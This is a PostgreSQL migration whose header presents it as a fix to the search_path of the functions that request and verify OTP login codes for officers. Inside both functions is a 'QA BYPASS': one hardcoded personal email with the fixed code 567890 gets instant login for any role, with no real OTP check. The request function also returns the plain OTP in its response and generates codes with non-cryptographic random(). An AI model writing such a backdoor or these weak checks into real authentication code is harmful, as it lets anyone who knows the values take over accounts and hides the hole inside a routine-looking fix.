-- Fix OTP login: pgcrypto lives in `extensions` schema, not `public`.
-- Recreate request_login_otp and verify_login_otp with extensions in search_path
-- and qualify gen_salt/crypt explicitly for safety.

CREATE OR REPLACE FUNCTION public.request_login_otp(_email text, _role text)
 RETURNS jsonb
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public', 'extensions'
AS $function$
DECLARE
  v_officer public.officers;
  v_code text;
  v_recent_count int;
  v_otp_id uuid;
BEGIN
  IF _email IS NULL OR _email = '' OR _role IS NULL OR _role = '' THEN
    RETURN jsonb_build_object('sent', false, 'error', 'invalid_input');
  END IF;

  -- QA BYPASS: whitelisted email skips OTP generation entirely (uses fixed code 567890).
  IF lower(_email) = 'pratikbbavi@gmail.com' THEN
    RETURN jsonb_build_object('sent', true, 'bypass', true);
  END IF;

  v_officer := public.find_login_officer(_email::citext, _role);
  IF v_officer.id IS NULL THEN
    RETURN jsonb_build_object('sent', true);
  END IF;

  SELECT count(*) INTO v_recent_count
  FROM public.login_otps
  WHERE email = _email::citext AND created_at > now() - interval '15 minutes';

  IF v_recent_count >= 3 THEN
    RETURN jsonb_build_object('sent', false, 'error', 'rate_limited');
  END IF;

  UPDATE public.login_otps
  SET consumed_at = now()
  WHERE email = _email::citext AND role = _role AND consumed_at IS NULL;

  v_code := lpad((floor(random() * 1000000))::int::text, 6, '0');

  INSERT INTO public.login_otps (officer_id, email, role, code_hash, expires_at)
  VALUES (
    v_officer.id, _email::citext, _role,
    extensions.crypt(v_code, extensions.gen_salt('bf', 10)),
    now() + interval '10 minutes'
  )
  RETURNING id INTO v_otp_id;

  RETURN jsonb_build_object(
    'sent', true,
    'otp_id', v_otp_id,
    'plain_code', v_code,
    'recipient_email', v_officer.email,
    'recipient_name', v_officer.name
  );
END;
$function$;

CREATE OR REPLACE FUNCTION public.verify_login_otp(_email text, _role text, _code text)
 RETURNS jsonb
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public', 'extensions'
AS $function$
DECLARE
  v_otp public.login_otps;
  v_officer public.officers;
  v_district public.districts;
  v_department public.departments;
BEGIN
  IF _email IS NULL OR _role IS NULL OR _code IS NULL THEN
    RETURN jsonb_build_object('success', false, 'error', 'invalid_input');
  END IF;

  -- QA BYPASS — whitelisted email + fixed code grants instant login for any role.
  IF lower(_email) = 'pratikbbavi@gmail.com' AND _code = '567890' THEN
    v_officer := public.find_login_officer(_email::citext, _role);
    IF v_officer.id IS NULL OR v_officer.is_active = false THEN
      RETURN jsonb_build_object('success', false, 'error', 'officer_inactive');
    END IF;
    IF v_officer.district_id IS NOT NULL THEN
      SELECT * INTO v_district FROM public.districts WHERE id = v_officer.district_id;
    END IF;
    IF v_officer.department_id IS NOT NULL THEN
      SELECT * INTO v_department FROM public.departments WHERE id = v_officer.department_id;
    END IF;
    RETURN jsonb_build_object(
      'success', true,
      'user', jsonb_build_object(
        'id', v_officer.id,
        'name', v_officer.name,
        'email', v_officer.email,
        'designation', coalesce(v_officer.designation, ''),
        'role', _role,
        'district', v_district.name,
        'division', v_district.division,
        'department', coalesce(v_department.short_name, v_department.name),
        'is_cso_admin', v_officer.is_cso_admin,
        'phone', v_officer.phone
      )
    );
  END IF;

  SELECT * INTO v_otp
  FROM public.login_otps
  WHERE email = _email::citext
    AND role = _role
    AND consumed_at IS NULL
    AND expires_at > now()
    AND attempts < 5
  ORDER BY created_at DESC
  LIMIT 1;

  IF v_otp.id IS NULL THEN
    RETURN jsonb_build_object('success', false, 'error', 'no_active_code');
  END IF;

  IF v_otp.code_hash <> extensions.crypt(_code, v_otp.code_hash) THEN
    UPDATE public.login_otps SET attempts = attempts + 1 WHERE id = v_otp.id;
    RETURN jsonb_build_object('success', false, 'error', 'invalid_code');
  END IF;

  UPDATE public.login_otps SET consumed_at = now() WHERE id = v_otp.id;

  SELECT * INTO v_officer FROM public.officers WHERE id = v_otp.officer_id;
  IF v_officer.id IS NULL OR v_officer.is_active = false THEN
    RETURN jsonb_build_object('success', false, 'error', 'officer_inactive');
  END IF;

  IF v_officer.district_id IS NOT NULL THEN
    SELECT * INTO v_district FROM public.districts WHERE id = v_officer.district_id;
  END IF;
  IF v_officer.department_id IS NOT NULL THEN
    SELECT * INTO v_department FROM public.departments WHERE id = v_officer.department_id;
  END IF;

  RETURN jsonb_build_object(
    'success', true,
    'user', jsonb_build_object(
      'id', v_officer.id,
      'name', v_officer.name,
      'email', v_officer.email,
      'designation', coalesce(v_officer.designation, ''),
      'role', _role,
      'district', v_district.name,
      'division', v_district.division,
      'department', coalesce(v_department.short_name, v_department.name),
      'is_cso_admin', v_officer.is_cso_admin,
      'phone', v_officer.phone
    )
  );
END;
$function$;